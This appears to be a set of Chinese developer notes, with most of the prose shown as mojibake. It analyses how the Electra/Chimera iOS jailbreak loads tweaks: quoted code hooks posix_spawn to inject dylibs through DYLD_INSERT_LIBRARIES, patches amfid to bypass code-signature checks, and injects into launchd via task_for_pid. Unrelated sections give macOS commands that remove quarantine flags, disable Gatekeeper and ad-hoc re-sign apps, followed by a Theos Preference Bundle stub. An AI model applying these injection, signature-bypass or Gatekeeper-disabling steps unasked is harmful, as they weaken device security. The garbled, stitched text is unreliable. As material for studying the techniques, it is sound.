ä»£ç å¼€æºï¼Œè€Œä¸”æ—©æœŸä¸€åˆ‡éƒ½æ˜¯ä»¥å®ç”¨ä¸ºä¸»ï¼Œä»£ç éƒ½æ¯”è¾ƒæœ‰ä»£è¡¨æ€§ã€‚

#pspawn_payload
å›åˆ°ä¹‹å‰çš„é—®é¢˜ï¼Œtweak loaderæ˜¯è°è´Ÿè´£åŠ è½½çš„å‘¢ï¼Ÿæœ€ç›´æ¥ç›¸å…³çš„ä»£ç åœ¨:

https://github.com/coolstar/electra/blob/master/basebinaries/pspawn_payload/pspawn_payload.m

ä»£ç é‡Œé¢çš„SBInject.dylibå°±æ˜¯tweak loaderï¼Œå¦‚ä¸‹

#define SBINJECT_PAYLOAD_DYLIB "/usr/lib/SBInject.dylib"
è¿™ä¸ªæ¨¡å—å«åšpspawn_payloadï¼Œä½ åœ¨coolstarç³»è¶Šç‹±é‡Œè¿›ç¨‹æ¨¡å—é‡Œé¢å°±ä¼šæœ‰è¿™ä¸ªæ¨¡å—åã€‚

ä¸‹é¢æ˜¯è¯¥æ¨¡å—åˆå§‹åŒ–çš„ä»£ç 

__attribute__ ((constructor))
static void ctor(void) {
    if (getpid() == 1) {
        current_process = PROCESS_LAUNCHD;
        pthread_t thd;
        pthread_create(&thd, NULL, thd_func, NULL);
    } else {
        current_process = PROCESS_XPCPROXY;
        rebind_pspawns();
    }
}
ä»£ç å°±æ˜¯å¦‚æœå½“å‰è¿›ç¨‹ä¸æ˜¯launchdï¼Œå°±hook pspawnså‡½æ•°ã€‚pspawnsæ­£æ˜¯åˆ›å»ºä¸€ä¸ªæ–°è¿›ç¨‹çš„å‡½æ•°ï¼Œæ‰€ä»¥hookä»¥åä¼šåœ¨åˆ›å»ºå‰æ³¨å…¥dylibã€‚ä¸‹é¢ç®€å•åˆ—ä¸¾é‡Œé¢å‡ ä¸ªå…³é”®åœ°æ–¹çš„ä»£ç 

int fake_posix_spawn_common(pid_t * pid, const char* path, const posix_spawn_file_actions_t *file_actions, posix_spawnattr_t *attrp, char const* argv[], const char* envp[], pspawn_t old) {

    ...
    if (strcmp(path, "/usr/libexec/amfid") == 0) {
        DEBUGLOG("Starting amfid -- special handling");
        inject_me = AMFID_PAYLOAD_DYLIB;
    } else {
        inject_me = SBINJECT_PAYLOAD_DYLIB;
    }
    ...

    int envcount = 0;

    if (envp != NULL){
        DEBUGLOG("Env: ");
        const char** currentenv = envp;
        while (*currentenv != NULL){
            DEBUGLOG("\t%s", *currentenv);
            if (strstr(*currentenv, "DYLD_INSERT_LIBRARIES") == NULL) {
                envcount++;
            }
            currentenv++;
        }
    }

    char const** newenvp = malloc((envcount+2) * sizeof(char **));
    int j = 0;
    for (int i = 0; i < envcount; i++){
        if (strstr(envp[j], "DYLD_INSERT_LIBRARIES") != NULL){
            continue;
        }
        newenvp[i] = envp[j];
        j++;
    }

    char *envp_inject = malloc(strlen("DYLD_INSERT_LIBRARIES=") + strlen(inject_me) + 1);

    envp_inject[0] = '\0';
    strcat(envp_inject, "DYLD_INSERT_LIBRARIES=");
    strcat(envp_inject, inject_me);

    newenvp[j] = envp_inject;
    newenvp[j+1] = NULL;

    ...

    origret = old(pid, path, file_actions, newattrp, argv, newenvp);

}
è¿™é‡Œæˆ‘åˆ†æä¸‹å‡ ä¸ªå…³é”®çš„åœ°æ–¹ï¼Œç¬¬ä¸€æ˜¯å¦‚æœå½“å‰è¦åˆ›å»ºè¿›ç¨‹ä¸º/usr/libexec/amfidï¼ˆä¹Ÿå°±æ˜¯éªŒè¯ä»£ç ç­¾åçš„è¿›ç¨‹ï¼‰ï¼Œé‚£ä¹ˆå°±æ³¨å…¥AMFID_PAYLOAD_DYLIBæ¨¡å—ï¼Œè¿™ä¸ªæ¨¡å—ä¸»è¦å°±æ˜¯å»patchéªŒè¯ç­¾åçš„åœ°æ–¹ï¼Œè¿™æ ·æ‰èƒ½æ‰§è¡Œä»»æ„ä»£ç ï¼›å¦‚æœæ˜¯å…¶ä»–è¿›ç¨‹ï¼Œé‚£ä¹ˆå°±æ³¨å…¥SBINJECT_PAYLOAD_DYLIBæ¨¡å—ï¼ˆä¹Ÿå°±æ˜¯tweak loaderï¼‰ã€‚ç¬¬äºŒä¸ªåœ°æ–¹æ˜¯ä»‹ç»äº†æ³¨å…¥çš„å®ç°æ–¹å¼ï¼ŒåŸç†å°±æ˜¯è®¾ç½®å½“å‰çš„ç¯å¢ƒå˜é‡ï¼Œåœ¨è°ƒç”¨åŸå‡½æ•°å‰ï¼Œå°†å½“å‰DYLD_INSERT_LIBRARIESè¿™ä¸ªç¯å¢ƒå˜é‡é‡Œé¢å¢åŠ ä¸€ä¸ªdylibè·¯å¾„ï¼Œè¿™æ ·åœ¨è¿›ç¨‹ç©¿ä»¶åå°±ä¼šå»åŠ è½½tweak loaderã€‚åˆ°è¿™é‡Œï¼Œæˆ‘ä»¬æ˜ç™½äº†tweak loaderåŸæ¥å°±æ˜¯åœ¨è¿™é‡Œè¢«æ³¨å…¥è¿›å»çš„ã€‚ä½†åŒæ—¶åˆå¼•å‡ºäº†ä¸€ä¸ªé—®é¢˜ï¼Œpspawn_payloadæ¨¡å—æœ¬èº«åˆæ˜¯è°åŠ è½½çš„å‘¢ï¼Ÿè¿™ä¸åˆå›åˆ°äº†ä¹‹å‰çš„é—®é¢˜ï¼Œæ¥ç€åˆ†æã€‚

#the fun part
è¿™é‡Œçš„åå­—å¹¶ä¸æ˜¯æˆ‘éšä¾¿èµ·çš„ï¼Œå› ä¸ºåœ¨Electraé‡Œé¢å°±æ˜¯å°±æ˜¯ã€‚ç›¸å…³çš„ä»£ç è·¯å¾„åœ¨

https://github.com/coolstar/electra/blob/02858b14dac30c9ba868bd3024529e9ae6592e67/electra/the%20fun%20part/fun.c
è¿™ä¸ªæ–‡ä»¶é‡Œé¢çš„ä»£ç ä¼šåšPost exploit patchingæ‰€æœ‰äº‹æƒ…ï¼Œå³åœ¨æ¼æ´å®Œæˆåˆ©ç”¨ä»¥åçš„æ‰€æœ‰äº‹ï¼Œè¿™é‡Œå½“ç„¶å°±æ˜¯æŒ‡è¶Šç‹±ç¯å¢ƒã€‚å’Œå…¶ä»–è¶Šç‹±ä¸€æ ·ï¼Œä¸»è¦å°±ä¸‹é¢å‡ ä¸ªå·¥ä½œ

åˆå§‹åŒ–jailbreakd
setuid(0)ï¼šå°†å½“å‰è¿›ç¨‹è®¾ä¸ºrootè¿›ç¨‹
Remap tfp0
Remount / as rw :é‡æ–°æŒ‚èµ·æ ¹ç›®å½•ï¼Œå®ç°ä»»æ„æ–‡ä»¶è¯»å†™
Prepare bootstrap binaryï¼šå‡†å¤‡é¢„è£…çš„ä¸€äº›åŸºæœ¬çš„äºŒè¿›åˆ¶æ–‡ä»¶ï¼ŒåŒ…æ‹¬sshdï¼Œgnuå‘½ä»¤ç­‰
setup hook enviroment : æ”¯æŒhookç¯å¢ƒ

launch some daemonï¼šåŠ è½½ä¸€äº›å®ˆæŠ¤è¿›ç¨‹

respring ï¼šé‡å¯Springboard
è¿™é‡Œçš„æœ€åä¸€æ­¥å¦‚æœå®Œæˆï¼Œä¹Ÿå°±æ˜¯å¹³æ—¶çœ‹åˆ°çš„é‚£æ ·ï¼Œä»£è¡¨è¶Šç‹±æˆåŠŸäº†ã€‚

å›æˆ‘ä¹‹å‰çš„é—®é¢˜ï¼Œè¿™äº›æ­¥éª¤é‡Œé¢æˆ‘ä»¬å…³å¿ƒçš„åœ°æ–¹å°±æ˜¯hookç¯å¢ƒçš„æ”¯æŒï¼Œç›´æ¥ç›¸å…³ä»£ç åœ¨

if (enable_tweaks){
    const char* args_launchd[] = {BinaryLocation, itoa(1), "/bootstrap/pspawn_payload.dylib", NULL};
    rv = posix_spawn(&pd, BinaryLocation, NULL, NULL, (char **)&args_launchd, NULL);
    waitpid(pd, NULL, 0);

    const char* args_recache[] = {"/bootstrap/usr/bin/recache", "--no-respring", NULL};
    rv = posix_spawn(&pd, "/bootstrap/usr/bin/recache", NULL, NULL, (char **)&args_recache, NULL);
    waitpid(pd, NULL, 0);
}
ä¹Ÿå°±æ˜¯è¯´å¦‚æœè®¾ç½®äº†æ”¯æŒtweakçš„è¯ï¼Œå°±ä¼šå°†pspawn_payloadæ¨¡å—æ³¨å…¥åˆ°1å·è¿›ç¨‹ï¼Œè€Œ1å·è¿›ç¨‹å°±æ˜¯launchdè¿›ç¨‹ã€‚å¦å¤–ä½ å¯èƒ½æƒ³é—®ï¼Œé‚£è¿™é‡Œçš„æ³¨å…¥åˆæ˜¯æ€ä¹ˆå®ç°çš„å‘¢ï¼Ÿä¸å¯èƒ½åˆæ˜¯hook posix_spawnæ³¨å…¥ç¯å¢ƒå˜é‡å§ï¼Œè¿™ä¸å°±äº§ç”Ÿé¸¡ç”Ÿè›‹å’Œè›‹ç”Ÿé¸¡çš„é—®é¢˜äº†å—ï¼Ÿäº‹å®ä¸Šè¿™é‡Œçš„æ³¨å…¥å¹¶ä¸æ˜¯é€šè¿‡hook posix_spawnï¼Œæ³¨å…¥çš„å®ç°åœ¨

https://github.com/coolstar/electra/tree/02858b14dac30c9ba868bd3024529e9ae6592e67/basebinaries/inject_criticald
æ³¨å…¥çš„åŸç†å°±æ˜¯é€šè¿‡task_for_pidæ¥å®ç°çš„ï¼Œå¦‚æœä½ çš„è®¾å¤‡æ˜¯ç”¨çš„coolstarç³»è¶Šç‹±ï¼ˆElectraæˆ–è€…Chimeraï¼‰çš„è¯ï¼Œä½ ä¼šåœ¨è¶Šç‹±ç›®å½•ä¸‹å­˜åœ¨è¿™ä¸ªå¯æ‰§è¡Œæ–‡ä»¶ï¼Œä¸‹é¢æ˜¯Chimeraè¶Šç‹±çš„ä¿¡æ¯

xia0:/chimera root# ls -la
total 1100
drwxr-xr-x  8 root wheel    256 Feb 26 13:19 ./
drwxr-xr-x 28 root wheel    896 Sep 16 17:44 ../
-rwxr-xr-x  1 root wheel 168736 Sep 17 10:21 inject_criticald*
-rwxr-xr-x  1 root wheel 207920 Sep 17 10:21 jailbreakd*
-rwxr-xr-x  1 root wheel 133840 Sep 17 10:21 jailbreakd_client*
-rwxr-xr-x  1 root wheel 167296 Sep 17 10:21 libjailbreak.dylib*
-rwxr-xr-x  1 root wheel 236896 Sep 17 10:21 pspawn_payload-stg2.dylib*
-rwxr-xr-x  1 root wheel 202640 Sep 17 10:21 pspawn_payload.dylib*
xia0:/chimera root# ./inject_criticald 
Usage: inject_criticald <pid> <dylib>
inject_criticaldè¿™ä¸ªå‘½ä»¤å¯ä»¥ç›´æ¥å¯¹è¿›ç¨‹è¿›è¡Œæ³¨å…¥dylibã€‚åˆ°è¿™é‡Œï¼Œå…³äºtweak loaderçš„åŠ è½½é—®é¢˜å·²ç»å¾—åˆ°äº†è§£å†³ï¼Œæ•´ä¸ªåŠ è½½çš„è¿‡ç¨‹å¯ä»¥è¯´å°±æ˜¯è¶Šç‹±çš„æ•´ä¸ªè¿‡ç¨‹ã€‚ç°åœ¨tweak loaderç”±è°åŠ è½½çš„é—®é¢˜è§£å†³äº†ï¼Œä½†æ˜¯ä½•æ—¶è¢«åŠ è½½å’Œåˆå§‹åŒ–çš„é—®é¢˜è¿˜æ²¡è§£å†³ï¼Ÿæ¥ä¸‹æ¥å°±å’Œè¶Šç‹±æœ¬èº«ä¸ç›¸å…³äº†ï¼Œè¦ä»DYLD_INSERT_LIBRARIESè¯´èµ·

#DYLD_INSERT_LIBRARIES && dyld
ä¸‹é¢å°±æŠ›å¼€è¶Šç‹±ï¼Œè¿›å…¥DYLD_INSERT_LIBRARIESå’Œdyldçš„å®ç°ç»†èŠ‚é‡Œé¢ï¼Œç”±äºdyldæœ¬äº‹æ˜¯å¼€æºçš„ï¼Œæ‰€ä»¥ä»æºç å¼€å§‹åˆ†æã€‚ç›´æ¥æœç´¢DYLD_INSERT_LIBRARIESæœ€å¯ç–‘çš„åœ°æ–¹å°±åœ¨è¿™é‡Œ

// In order for register_func_for_add_image() callbacks to to be called bottom up,
// we need to maintain a list of root images. The main executable is usally the
// first root. Any images dynamically added are also roots (unless already loaded).
// If DYLD_INSERT_LIBRARIES is used, those libraries are first.
static void addRootImage(ImageLoader* image)
{
    //dyld::log("addRootImage(%p, %s)\n", image, image->getPath());
    // add to list of roots
    sImageRoots.push_back(image);
}
æ³¨é‡Šé‡Œé¢è¯´åˆ°äº†ä¸€å¥ï¼ŒIf DYLD_INSERT_LIBRARIES is used, those libraries are first.

ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœDYLD_INSERT_LIBRARIESç¯å¢ƒå˜é‡æ³¨å…¥çš„æ¨¡å—ä¼šè¢«ä¼˜å…ˆå¤„ç†ã€‚æœ¬èº«è¿™ä¸ªå‡½æ•°çš„è¯æ˜¯åœ¨ä¸‹é¢å‡½æ•°ä¸­è°ƒç”¨

void link(ImageLoader* image, bool forceLazysBound, bool neverUnload, const ImageLoader::RPathChain& loaderRPaths)
{
    // add to list of known images.  This did not happen at creation time for bundles
    if ( image->isBundle() && !image->isLinked() )
        addImage(image);

    // we detect root images as those not linked in yet 
    if ( !image->isLinked() )
        addRootImage(image);

    // process images
    try {
        image->link(gLinkContext, forceLazysBound, false, neverUnload, loaderRPaths);
    }
    catch (const char* msg) {
        garbageCollectImages();
        throw;
    }
}
æ¥ä¸‹æ¥ä¸€ä¸ªé‡è¦çš„å‡½æ•°å°±æ˜¯initializeMainExecutable()

void initializeMainExecutable()
{
    // record that we've reached this step
    gLinkContext.startedInitializingMainExecutable = true;

    // run initialzers for any inserted dylibs
    ImageLoader::InitializerTimingList initializerTimes[sAllImages.size()];
    initializerTimes[0].count = 0;
    const size_t rootCount = sImageRoots.size();
    if ( rootCount > 1 ) {
        for(size_t i=1; i < rootCount; ++i) {
            sImageRoots[i]->runInitializers(gLinkContext, initializerTimes[0]);
        }
    }

    // run initializers for main executable and everything it brings up 
    sMainExecutable->runInitializers(gLinkContext, initializerTimes[0]);

    // register cxa_atexit() handler to run static terminators in all loaded images when this process exits
    if ( gLibSystemHelpers != NULL ) 
        (*gLibSystemHelpers->cxa_atexit)(&runAllStaticTerminators, NULL, NULL);

    // dump info if requested
    if ( sEnv.DYLD_PRINT_STATISTICS )
        ImageLoaderMachO::printStatistics((unsigned int)sAllImages.size(), initializerTimes[0]);
}
è¿™é‡Œå¯ä»¥çœ‹åˆ°ä¼šå»å…ˆåˆå§‹åŒ–sImageRootsï¼Œç„¶åæ‰åˆå§‹åŒ–sMainExecutableã€‚å½“ç„¶åé¢å°±æ˜¯ä¸€ä¸ªé€’å½’çš„åˆå§‹åŒ–è¿‡ç¨‹ï¼Œå³æ˜¯è¯´å¦‚æœåˆå§‹åŒ–çš„æ¨¡å—ä¾èµ–å…¶ä»–æ¨¡å—ï¼Œé‚£ä¹ˆåˆå…ˆåˆå§‹åŒ–ä¾èµ–çš„æ¨¡å—ã€‚åœ¨é€’å½’åˆå§‹åŒ–å‡½æ•°ä¹‹ä¸­æœ‰ä¸ªåœ°æ–¹

void ImageLoader::recursiveInitialization(const LinkContext& context, mach_port_t this_thread,
                                          InitializerTimingList& timingInfo, UninitedUpwards& uninitUps)
{
    ...
    // let objc know we are about to initialize this image
    uint64_t t1 = mach_absolute_time();
    fState = dyld_image_state_dependents_initialized;
    oldState = fState;
    context.notifySingle(dyld_image_state_dependents_initialized, this);

    // initialize this image
    bool hasInitializers = this->doInitialization(context);

    // let anyone know we finished initializing this image
    fState = dyld_image_state_initialized;
    oldState = fState;
    context.notifySingle(dyld_image_state_initialized, this);

    ...
}
ä»è¿™é‡Œå¯ä»¥çœ‹å‡ºï¼Œ+loadå‡½æ•°ç¡®å®ä¼šæ¯”mod_init_funcä¼˜å…ˆæ‰§è¡Œã€‚

æœ€åæ€»ç»“ä¸€ä¸‹ï¼Œç”±äºtweak loaderæ˜¯é€šè¿‡DYLD_INSERT_LIBRARIESæ³¨å…¥çš„ï¼Œæ‰€ä»¥ä¼šä¼˜å…ˆåˆå§‹åŒ–ï¼Œåªæœ‰è¿™æ ·æ‰èƒ½å®ç°åŠ è½½tweakæ¨¡å—çš„åŠŸèƒ½ã€‚åˆ°è¿™é‡Œtweak loaderä½•æ—¶è¢«åˆå§‹åŒ–çš„ç–‘é—®ä¹Ÿå¾—åˆ°äº†è§£å†³ï¼Œåé¢ä¼šç”¨å®éªŒå»éªŒè¯è¿™ä¸ªåˆ†æã€‚

#å®éªŒ
å‰é¢åˆ†æäº†è¿™ä¹ˆå¤šï¼Œé‚£å®é™…æƒ…å†µåˆ°åº•æ˜¯ä¸æ˜¯è¿™æ ·çš„å‘¢ã€‚é¦–å…ˆæˆ‘ä»¬è¿˜æ˜¯å¯¹CFBundleGetMainBundleã€Appé‡Œé¢çš„+loadå’Œmod_init_funcä¸‹æ–­ç‚¹ï¼Œé¦–å…ˆæ–­ä¸‹æ¥çš„æ˜¯ï¼š

(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 4.1
  * frame #0: 0x00000001fd2d18ac CoreFoundation`CFBundleGetMainBundle
    frame #1: 0x00000001fdbfeadc Foundation`+[NSBundle mainBundle] + 112
    frame #2: 0x00000001024a2ee0 TweakInject.dylib`___lldb_unnamed_symbol1$$TweakInject.dylib + 96
    frame #3: 0x000000010256f56c dyld`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&) + 424
    frame #4: 0x000000010256f7ac dyld`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&) + 40
    frame #5: 0x0000000102569f64 dyld`ImageLoader::recursiveInitialization(ImageLoader::LinkContext const&, unsigned int, char const*, ImageLoader::InitializerTimingList&, ImageLoader::UninitedUpwards&) + 512
    frame #6: 0x0000000102568dd8 dyld`ImageLoader::processInitializers(ImageLoader::LinkContext const&, unsigned int, ImageLoader::InitializerTimingList&, ImageLoader::UninitedUpwards&) + 152
    frame #7: 0x0000000102568e98 dyld`ImageLoader::runInitializers(ImageLoader::LinkContext const&, ImageLoader::InitializerTimingList&) + 88
    frame #8: 0x00000001025567d4 dyld`dyld::initializeMainExecutable() + 188
    frame #9: 0x000000010255b88c dyld`dyld::_main(macho_header const*, unsigned long, int, char const**, char const**, char const**, unsigned long*) + 4708
    frame #10: 0x0000000102555044 dyld`_dyld_start + 68
ä»è°ƒç”¨é“¾æ¥çœ‹initializeMainExecutableåå°±æ˜¯å…ˆåˆå§‹åŒ–TweakInject.dylibï¼Œè¿™æ—¶å€™appè‡ªèº«ä»£ç è¿˜æ²¡æ‰§è¡Œã€‚æ¥ä¸‹æ¥æ–­ä¸‹æ¥æ˜¯

(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 3.1
  * frame #0: 0x000000010244e7f0 TestAPP`+[OCClassDemo load](self=OCClassDemo, _cmd="load") at OCClassDemo.m:20:5
    frame #1: 0x00000001fc476a24 libobjc.A.dylib`call_load_methods + 188
    frame #2: 0x00000001fc477d94 libobjc.A.dylib`load_images + 148
    frame #3: 0x00000001025564c4 dyld`dyld::notifySingle(dyld_image_states, ImageLoader const*, ImageLoader::InitializerTimingList*) + 488
    frame #4: 0x0000000102569f40 dyld`ImageLoader::recursiveInitialization(ImageLoader::LinkContext const&, unsigned int, char const*, ImageLoader::InitializerTimingList&, ImageLoader::UninitedUpwards&) + 476
    frame #5: 0x0000000102568dd8 dyld`ImageLoader::processInitializers(ImageLoader::LinkContext const&, unsigned int, ImageLoader::InitializerTimingList&, ImageLoader::UninitedUpwards&) + 152
    frame #6: 0x0000000102568e98 dyld`ImageLoader::runInitializers(ImageLoader::LinkContext const&, ImageLoader::InitializerTimingList&) + 88
    frame #7: 0x00000001025567f8 dyld`dyld::initializeMainExecutable() + 224
    frame #8: 0x000000010255b88c dyld`dyld::_main(macho_header const*, unsigned long, int, char const**, char const**, char const**, unsigned long*) + 4708
    frame #9: 0x0000000102555044 dyld`_dyld_start + 68
ä»è°ƒç”¨é“¾çœ‹ï¼Œè¿™æ—¶å€™å¼€å§‹åˆå§‹åŒ–ä¸»æ¨¡å—ï¼Œè€Œä¸”æ­£æ˜¯+loadå‡½æ•°ï¼Œæ‰€ä»¥+loadå°±æ˜¯appæœ€æ—©æ‰§è¡Œä»£ç çš„åœ°æ–¹ã€‚è€Œä¸”æ˜¯é€šçŸ¥libobjc.A.dylibå»å®Œæˆçš„ã€‚è¿™é‡Œå¯ä»¥å›åˆ°dyldçš„æºç ä¸­ï¼š

static void notifySingle(dyld_image_states state, const ImageLoader* image)
{
    //dyld::log("notifySingle(state=%d, image=%s)\n", state, image->getPath());
    std::vector<dyld_image_state_change_handler>* handlers = stateToHandlers(state, sSingleHandlers);
    if ( handlers != NULL ) {
        dyld_image_info info;
        info.imageLoadAddress    = image->machHeader();
        info.imageFilePath        = image->getRealPath();
        info.imageFileModDate    = image->lastModified();
        for (std::vector<dyld_image_state_change_handler>::iterator it = handlers->begin(); it != handlers->end(); ++it) {
            const char* result = (*it)(state, 1, &info);
            if ( (result != NULL) && (state == dyld_image_state_mapped) ) {
                //fprintf(stderr, "  image rejected by handler=%p\n", *it);
                // make copy of thrown string so that later catch clauses can free it
                const char* str = strdup(result);
                throw str;
            }
        }
    }
    ...
}
notifySingleå‡½æ•°ä¼šå¾ªç¯è°ƒç”¨æ‰€æœ‰æ³¨å†Œé€šçŸ¥çš„å¤„ç†æ¨¡å—

// Callback that provides a bottom-up array of images
// For dyld_image_state_[dependents_]mapped state only, returning non-NULL will cause dyld to abort loading all those images
// and append the returned string to its load failure error message. dyld does not free the string, so
// it should be a literal string or a static buffer
//
typedef const char* (*dyld_image_state_change_handler)(enum dyld_image_states state, uint32_t infoCount, const struct dyld_image_info info[]);
è¿™é‡Œå°±æ˜¯ç”±libobjc.A.dylibå»å¤„ç†çš„+loadå‡½æ•°ã€‚æœ€åæ–­ä¸‹æ¥çš„å°±æ˜¯ï¼š

(lldb) bt
* thread #1, queue = 'com.apple.main-thread', stop reason = breakpoint 1.1
  * frame #0: 0x000000010242bd20 TestAPP`temp_init at temp.c:98:5
    frame #1: 0x000000010256f56c dyld`ImageLoaderMachO::doModInitFunctions(ImageLoader::LinkContext const&) + 424
    frame #2: 0x000000010256f7ac dyld`ImageLoaderMachO::doInitialization(ImageLoader::LinkContext const&) + 40
    frame #3: 0x0000000102569f64 dyld`ImageLoader::recursiveInitialization(ImageLoader::LinkContext const&, unsigned int, char const*, ImageLoader::InitializerTimingList&, ImageLoader::UninitedUpwards&) + 512
    frame #4: 0x0000000102568dd8 dyld`ImageLoader::processInitializers(ImageLoader::LinkContext const&, unsigned int, ImageLoader::InitializerTimingList&, ImageLoader::UninitedUpwards&) + 152
    frame #5: 0x0000000102568e98 dyld`ImageLoader::runInitializers(ImageLoader::LinkContext const&, ImageLoader::InitializerTimingList&) + 88
    frame #6: 0x00000001025567f8 dyld`dyld::initializeMainExecutable() + 224
    frame #7: 0x000000010255b88c dyld`dyld::_main(macho_header const*, unsigned long, int, char const**, char const**, char const**, unsigned long*) + 4708
    frame #8: 0x0000000102555044 dyld`_dyld_start + 68
è¿™é‡Œçœ‹å‡ºå°±æ˜¯mod_init_funcäº†ï¼Œå½“ç„¶åœ¨dyldä¸­è°ƒç”¨è¿™ä¸ªå‡½æ•°çš„åœ°æ–¹å°±æ˜¯

bool ImageLoaderMachO::doInitialization(const LinkContext& context)
{
    CRSetCrashLogMessage2(this->getPath());

    // mach-o has -init and static initializers
    doImageInit(context);
    doModInitFunctions(context);

    CRSetCrashLogMessage2(NULL);

    return (fHasDashInit || fHasInitializers);
}
å…¶ä¸­doModInitFunctionså°±ä¼šè§£æload commandæ‰¾åˆ°_DATA,_mod_init_funcåˆ—è¡¨è¿›è¡Œåˆå§‹åŒ–è°ƒç”¨ã€‚

### è§£å†³â€œXX.appâ€å·²æŸå,æ— æ³•æ‰“å¼€ã€‚ æ‚¨åº”è¯¥å°†å®ƒç§»åˆ°åºŸçº¸ç¯“ã€‚

é€šå¸¸åœ¨é Mac App Storeä¸‹è½½çš„è½¯ä»¶éƒ½ä¼šæç¤ºâ€œxxxå·²æŸåï¼Œæ‰“ä¸å¼€ã€‚
æ‚¨åº”å°†å®ƒç§»åˆ°åºŸçº¸ç¯“â€æˆ–è€…â€œæ‰“ä¸å¼€ xxxï¼Œå› ä¸ºå®ƒæ¥è‡ªèº«ä»½ä¸æ˜çš„å¼€å‘è€…â€ã€‚
åŸå› ï¼šMacç”µè„‘å¯ç”¨äº†å®‰å…¨æœºåˆ¶ï¼Œé»˜è®¤åªä¿¡ä»»Mac App Storeä¸‹è½½çš„è½¯ä»¶ä»¥åŠæ‹¥æœ‰å¼€å‘è€… ID ç­¾åçš„è½¯ä»¶ï¼Œä½†æ˜¯åŒæ—¶ä¹Ÿé˜»æ­¢äº†æ²¡æœ‰å¼€å‘è€…ç­¾åçš„ â€œè€å®è½¯ä»¶â€

è§£å†³æ–¹æ³•ï¼š

#### 1. macOS Catalina 10.15ç³»ç»Ÿï¼š

æ‰“å¼€ã€Œç»ˆç«¯.appã€ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤å¹¶å›è½¦ï¼Œè¾“å…¥å¼€æœºå¯†ç å›è½¦

sudo xattr -rd com.apple.quarantine ç©ºæ ¼ è½¯ä»¶çš„è·¯å¾„

å¦‚CleanMyMac X.app
```
sudo xattr -rd com.apple.quarantine /Applications/CleanMyMac X.app
```
#### 2. macOS Mojave 10.14åŠä»¥ä¸‹ç³»ç»Ÿï¼š

æ‰“å¼€ã€Œç»ˆç«¯.appã€ï¼Œè¾“å…¥ä»¥ä¸‹å‘½ä»¤å¹¶å›è½¦ï¼Œè¾“å…¥å¼€æœºå¯†ç å›è½¦
```
sudo spctl --master-disable
```
3. macOS Catalina 10.15.4 ç³»ç»Ÿï¼š

æ›´æ–°10.15.4ç³»ç»Ÿåè½¯ä»¶å‡ºç°æ„å¤–é€€å‡ºï¼Œå¯æŒ‰ç…§ä¸‹é¢çš„æ–¹æ³•ç»™è½¯ä»¶ç­¾å

1.å®‰è£…Command Line Tools å·¥å…·

æ‰“å¼€ã€Œç»ˆç«¯appã€è¾“å…¥å¦‚ä¸‹å‘½ä»¤ï¼š

xcode-select --install

2.ç»™è½¯ä»¶ç­¾å

æ‰“å¼€ç»ˆç«¯å·¥å…·è¾“å…¥å¹¶æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š

sudo codesign --force --deep --sign - (åº”ç”¨è·¯å¾„)

3.é”™è¯¯è§£å†³

å¦‚å‡ºç°ä»¥ä¸‹é”™è¯¯æç¤ºï¼š

/æ–‡ä»¶ä½ç½® : replacing existing signature

/æ–‡ä»¶ä½ç½® : resource fork,Finder information,or similar detritus not allowed

é‚£ä¹ˆï¼Œå…ˆåœ¨ç»ˆç«¯æ‰§è¡Œï¼š

xattr -cr /æ–‡ä»¶ä½ç½®ï¼ˆç›´æ¥å°†åº”ç”¨æ‹–è¿›å»å³å¯ï¼‰

ç„¶åå†æ¬¡æ‰§è¡Œå¦‚ä¸‹æŒ‡ä»¤å³å¯ï¼š

codesign --force --deep --sign - /æ–‡ä»¶ä½ç½®ï¼ˆç›´æ¥å°†åº”ç”¨æ‹–è¿›å»å³å¯ï¼‰

## iOSç§æœ‰åº“ å¤´æ–‡ä»¶æŸ¥è¯¢ç½‘å€
## https://developer.limneos.net/

### Preference Bundle
æ’ä»¶è®¾ç½®é¡¹Preference Bundle
ä¸€ä¸ªtweakå¯èƒ½è¦è®¾ç½®ä¸€äº›é€‰é¡¹ï¼Œå°±åƒApp Storeä¸Šçš„Appä¸€æ ·ï¼Œåœ¨è®¾ç½®åº”ç”¨é‡Œé¢å¯ä»¥è®¾ç½®ï¼Œ
åœ¨theosé‡Œï¼Œå¯ä»¥é€šè¿‡åˆ›å»ºPreference Bundleæ¥ä¸ºæ’ä»¶æä¾›è®¾ç½®ç•Œé¢,æœ‰ç‚¹ç±»ä¼¼äºXcodeé‡Œçš„Setting Bundle,
Preference Bundleå®‰è£…åˆ°æ‰‹æœºåä¼šåœ¨/Library/PreferenceBundles/ç›®å½•ç”Ÿæˆä¸€ä¸ªå¯¹åº”çš„bundle,
æ­¤bundleä¼šåŸºäºPreferenceLoaderæ³¨å…¥åˆ°è®¾ç½®åº”ç”¨(Setting.app)ï¼Œ
è€ŒPreferenceLoaderæ˜¯åŸºäºCydia Substrateçš„å·¥å…·ï¼Œä¸»è¦ä¸ºæ’ä»¶åœ¨ç³»ç»Ÿè®¾ç½®ç•Œé¢æ·»åŠ ä¸€ä¸ªè®¾ç½®å…¥å£ã€‚
```
æ–‡ä»¶	                  ä½œç”¨
entry.plist	        ä¸ºæ’ä»¶åœ¨ç³»ç»Ÿè®¾ç½®åº”ç”¨ç•Œé¢æ·»åŠ ä¸€ä¸ªå…¥å£ï¼Œä¸€èˆ¬ä¿®æ”¹iconä¸labelå³å¯
XXXRootListController	XXXRootListControllerå¿…é¡»ç»§æ‰¿PSListControlleræˆ–è€…PSViewControllerï¼Œä¸”å¿…é¡»å®ç°- (id)specifiersæ–¹æ³•ï¼Œå› ä¸ºPSListControllerä¾èµ–_specifiersæ¥è·å¾—metadataå’Œgroup
Makefile	        preference bundleçš„Makefileï¼Œä¸€èˆ¬ä¸ç”¨è¿‡å¤šä¿®æ”¹ä¸æ“ä½œï¼Œç¼–è¯‘Tweakçš„Makefileä¼šè·Ÿéšç€ä¸€èµ·ç¼–è¯‘
Resourcesæ–‡ä»¶å¤¹ä¸‹çš„æ–‡ä»¶å¦‚ä¸‹	
Info.plist	        ä¸»è¦è®°å½•è¿™ä¸ªpreference bundleçš„é…ç½®ä¿¡æ¯ï¼Œä¸€èˆ¬ä¸ç”¨ä¿®æ”¹
